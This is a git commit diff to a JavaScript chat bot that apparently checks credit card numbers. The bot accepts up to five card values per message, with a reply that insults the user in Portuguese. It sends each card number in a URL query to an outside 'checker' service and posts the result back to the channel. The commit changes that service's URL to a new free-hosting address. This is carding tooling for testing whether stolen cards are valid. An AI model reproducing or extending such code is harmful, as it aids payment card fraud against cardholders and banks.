b16320de1260b17214d10da1ac1c6371d97d423c
botuliambr <33078224+botuliambr@users.noreply.github.com>
2018-05-29 22:37:50 -0300

    Update bot.js

--- bot.js
+++ bot.js
@@ -50,7 +50,7 @@ if(cc.length > 5){
 return message.reply("5 CC POR VEZ FDP");
 }
         cc.forEach(function (value) {
-      Request("http://thelimaochecker.tk/painel/full/api.php?dados=" + value, function(result) {
+      Request("https://potential-winch.000webhostapp.com/apibot.php?dados=" + value, function(result) {
             message.channel.send(result);
       });
         });
